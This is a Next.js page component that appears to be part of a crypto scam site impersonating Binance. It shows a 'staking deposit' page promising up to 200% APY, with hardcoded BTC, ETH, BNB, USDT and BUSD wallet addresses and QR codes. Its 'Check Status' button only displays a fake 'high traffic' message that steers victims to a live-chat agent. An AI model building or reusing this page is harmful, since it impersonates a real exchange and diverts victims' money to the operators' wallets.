import Head from 'next/head'
import Script from 'next/script'
import Link from 'next/link'
import CurrencyFormat from "react-currency-format";
import { useState, useEffect } from 'react'
import { useDispatch, useSelector } from 'react-redux'
import { LockClosedIcon } from "@heroicons/react/solid"
import Loader from '../../components/loader'
import { setMessage } from '../../redux/APP_STATE/actions'

export default function Invoice() {
  const dispatch = useDispatch()
  const amount = useSelector(state => state.APP_STATE.amount)
  const [address, setAddress] = useState('bc1q48cetrkz4w8dhlj760909y9dsdtpvumx7huxg2')
  const [image, setImage] = useState("/qr/btc.jpeg")
  const [network, setNetwork] = useState(null)

  const handle_payment_method = () => {
    const select = document.querySelector(".select").value;

    if (select === 'btc') {
      setNetwork(null)
      setAddress("bc1q48cetrkz4w8dhlj760909y9dsdtpvumx7huxg2");
      setImage("/qr/btc.jpeg")
    } else if (select === 'eth') {
      setNetwork(null)
      setAddress("0x6Cc1AD2346e269Ea68A1f507eF1D4a6e61689ef2");
      setImage('/qr/eth.jpeg')
    } else if (select === 'bnb') {
      setNetwork(null)
      setAddress("bnb17wk7z0pwgll0mk9dr8fxe643e4thwcjqppr4xk");
      setImage('/qr/bnb.jpeg')
    } else if (select === 'usdt') {
      setNetwork('TRC20')
      setAddress("TLgNSbJVFbofiD3PW73TYTumZZzgAgDXXi");
      setImage('/qr/usdt-trc-20.jpeg')
    } else if (select === 'busd') {
      setNetwork('ERC20')
      setAddress("0x6Cc1AD2346e269Ea68A1f507eF1D4a6e61689ef2");
      setImage('/qr/busd-erc-20.jpeg')
    }
  }
  
  const handle_confirmation_message = () => {
    dispatch(setMessage(
      'Your transaction is still in progress, we are experiencing a high volume of traffic if you have paid and still do not a get confirmation please send a screenshot of the sucess transaction to our live support at the right bottom corner of your screen an agent will attend to you.'
    ))
  }

  const curreny_amount = () => {
    return (
      <span className="inline-block">
        <CurrencyFormat
        renderText={(value) => (
            <>
            <p>
                <span>{value}</span>
            </p>
            </>
        )}
        value={amount ? amount : 0}
        decimalScale={2}
        fixedDecimalScale={true}
        thousandSeparator={true}
        displayType={"text"}
        prefix={"$"}
      />
      </span>
    )
  }

  return (
    <div id="wrapper" className='text-sm font-ibm_plex text-gray-800 h-[100vh]'>
        <Loader />
      <Head>
        <title>Binance Staking Make Deposit</title>
        <meta name="description" content="Start staking and earn up to 200% APY." />
        <link rel="icon" href="/favicon.ico" />
        <Script src="//code-eu1.jivosite.com/widget/VBkQPci8kv" async></Script>
      </Head>

      {/* LOGIN HEADER */}
      <div id="Header" className='flex justify-between p-5'>
        <div className="logo">
          <img className='h-6' src="/binance-logo.svg" alt="Logo" />
        </div>
        <div className="menu">English |</div>
      </div>
      {/* URL Verification INFO */}
      {/* <div className='w-full flex items-center justify-center p-2.5 text-xs text-gray-700 bg-[#FEF6D8]'>
              <p><span className='font-semibold'><LockClosedIcon className='h-5 mr-1 text-green-500 inline' /> URL verification: </span><span className='text-green-400'>https://</span>{host_url}{ path_name }</p>
      </div> */}

      {/* ====================== LOGIN SECTION ==================== */}
      <div className="max-w-4xl px-5 pt-2 pb-3 mx-auto md:flex justify-between items-end text-gray-600">
        <div className="w-full md:w-[400px] mb-5 md:mb-10">
          <h2 className="text-xl md:text-3xl font-semibold my-8 md:my-10 ">Deposit</h2>
          <p className='text-gray-500 text-base mb-6 pt-2'>To pay, please send { curreny_amount() } to the given address or select a payment method below.</p>
          <div className="qr_card">
            {
              network ?
                <span className="block text-center mx-auto font-semibold px-6 py-3 bg-amber-100">{network}</span>
                :
                null
            }
            <img src={ image } alt="qr" className='w-40 mt-6 mx-auto' />
          </div>
          <form className="my-5">
            <div className="input_field">
              {/* <label className="block">Address</label> */}
              <div className="px-3 w-full border rounded-md focus-within:border-[#E18404] flex justify-center items-center">
                <input type="text" value={ address } className='py-3.5 pr-3.5 w-[80%] outline-none text-center text-gray-600 font-medium appearance-none' />
              </div>
            </div>
            <div className="input_field">
              <label className="block">Payment method</label>
              <div className="px-3 w-full border rounded-md focus-within:border-[#E18404] flex justify-between items-center">
                {/* <input type="number" placeholder='e.g 1000 USD' className='py-3.5 pr-3.5 w-[80%] outline-none appearance-none' /> */}
                <select onChange={ handle_payment_method }  className='select py-3.5 pr-3.5 w-full outline-none appearance-none' >
                    <option value="">Select</option>
                    <option selected value="btc">Bitcoin (BTC)</option>
                    <option value="eth">Ethereum (ETH)</option>
                    <option value="bnb">Binance Coin (BNB)</option>
                    <option value="busd">Binance USD (BUSD)</option>
                    <option value="usdt">Tether (USDT)</option>
                </select>
                 {/* <span className="inline-block text-primary_dim font-semibold cursor-pointer mr-1">Get code</span>  */}
              </div>
            </div>

          </form>
          {/* <button className="w-full bg-gradient-to-b from-primary to-[#E49F5E] text-center text-gray-800 font-semibold p-3 rounded-sm">Log In</button> */}
          <button onClick={ handle_confirmation_message} className="w-full bg-primary text-center text-gray-800 font-semibold p-3 mt-3 mb-2 rounded-sm">Check Status</button>
          <Link href="/signup"><span className="text-primary_dim my-2 cursor-pointer">Unable to deposit?</span></Link>
        </div>
      </div>
      {/* <footer>
        <div className="w-full pt-10 text-xs absolute bottom-5 text-gray-500 text-center">&copy; 2017 - { new Date().getFullYear() } Binance.com All rights reserved</div>
      </footer> */}
    </div>
  )
}
